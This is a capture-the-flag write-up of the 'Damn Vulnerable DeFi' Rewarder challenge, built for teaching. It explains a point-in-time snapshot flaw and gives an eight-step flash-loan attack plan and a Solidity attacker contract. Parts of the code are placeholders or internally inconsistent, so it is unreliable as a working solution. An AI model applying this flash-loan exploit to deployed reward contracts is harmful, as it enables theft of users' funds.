# Damn Vulnerable DeFi: Rewarder

## Challenge Description
A contract distributes reward tokens to users who provide liquidity to a specific DVT/ETH pool. Rewards are distributed every 5 days. The pool has 100,000 DVT tokens to distribute. You have 0 DVT tokens. Your goal is to claim more rewards than the legitimate liquidity providers.

**Difficulty:** ⭐⭐⭐⭐ (Medium-Hard)

**Goal:** Drain the rewarder contract's DVT tokens in a single transaction.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract TheRewarder {
    IERC20 public liquidityToken;
    IERC20 public rewardToken;
    uint256 public lastSnapshotIdForRewards;
    uint256 public lastDistributionTimestamp;
    uint256 public constant REWARDS_SNAPSHOT_INTERVAL = 5 days;

    constructor(IERC20 _liquidityToken, IERC20 _rewardToken) {
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
    }

    function distributeRewards() public {
        require(
            block.timestamp >= lastDistributionTimestamp + REWARDS_SNAPSHOT_INTERVAL,
            "Not enough time has passed"
        );
        lastDistributionTimestamp = block.timestamp;
        lastSnapshotIdForRewards = /* capture current snapshot */;

        // Distribute rewards based on snapshot balances
        // (Simplified: iterates over users and transfers rewardToken)
    }

    function claimReward() public {
        uint256 amount = getRewardAmount(msg.sender);
        if (amount > 0) {
            rewardToken.transfer(msg.sender, amount);
        }
    }
}
```

## Vulnerability Analysis

```text
THE BUG: The reward calculation is based on a snapshot of the user's liquidity token balance
AT THE EXACT MOMENT the snapshot is taken, NOT averaged over the 5-day period.

If you can acquire a massive amount of liquidity tokens right before the snapshot is taken,
you will be credited with a massive reward, even if you only held the tokens for 1 second.

Since we can use a Flash Loan, we can borrow a massive amount of ETH, swap it for DVT
to get a huge liquidity balance, wait for the snapshot (or trigger it if allowed),
claim the rewards, swap back, and repay the flash loan—all in ONE transaction!
```

## Exploit Strategy

```text
Step 1: Take a massive Flash Loan of ETH.
Step 2: Swap the ETH for DVT tokens on the DEX to get a huge liquidity balance.
Step 3: Add this massive liquidity to the pool (if required) or just hold the tokens.
Step 4: Call distributeRewards() to take the snapshot (or wait for the exact block).
Step 5: Call claimReward() to drain the reward tokens based on your inflated balance.
Step 6: Swap the DVT back to ETH.
Step 7: Repay the Flash Loan.
Step 8: Keep the stolen reward tokens.
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/DamnVulnerableDeFi/TheRewarder.sol";

contract RewarderAttacker {
    IFlashLoanProvider public flashLoanProvider;
    TheRewarder public rewarder;
    IERC20 public liquidityToken;
    IERC20 public rewardToken;
    IDEX public dex;

    constructor(
        IFlashLoanProvider _flashLoanProvider,
        TheRewarder _rewarder,
        IERC20 _liquidityToken,
        IERC20 _rewardToken,
        IDEX _dex
    ) {
        flashLoanProvider = _flashLoanProvider;
        rewarder = _rewarder;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        dex = _dex;
    }

    function attack() external {
        // Step 1: Request flash loan
        flashLoanProvider.flashLoan(address(this), 1000000 ether);
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanProvider), "Unauthorized");

        // Step 2: Swap ETH for DVT to get massive liquidity balance
        dex.swap{value: amount}(address(liquidityToken));

        // Step 3 & 4: Trigger reward distribution (if timestamp allows)
        rewarder.distributeRewards();

        // Step 5: Claim the massive reward
        rewarder.claimReward();

        // Step 6: Swap DVT back to ETH
        uint256 dvtBalance = liquidityToken.balanceOf(address(this));
        liquidityToken.approve(address(dex), dvtBalance);
        dex.swap(address(liquidityToken), address(this), dvtBalance);

        // Step 7: Repay flash loan
        flashLoanProvider.repay(amount);
    }

    receive() external payable {}
}
```

## Key Takeaways
- **Snapshot Vulnerabilities:** Reward distributions based on instantaneous snapshots are highly vulnerable to flash loan manipulation.
- **Time-Weighted Average:** Always use Time-Weighted Average Balances (like Uniswap V3 TWAP) for reward calculations, not point-in-time snapshots.
- **Flash Loan Amplification:** Flash loans can amplify your capital to absurd levels for a single block, breaking any logic that assumes "balance = long-term commitment".
- **Lesson Learned:** If a contract rewards users for "providing liquidity over time", ensure it mathematically enforces the "over time" part.
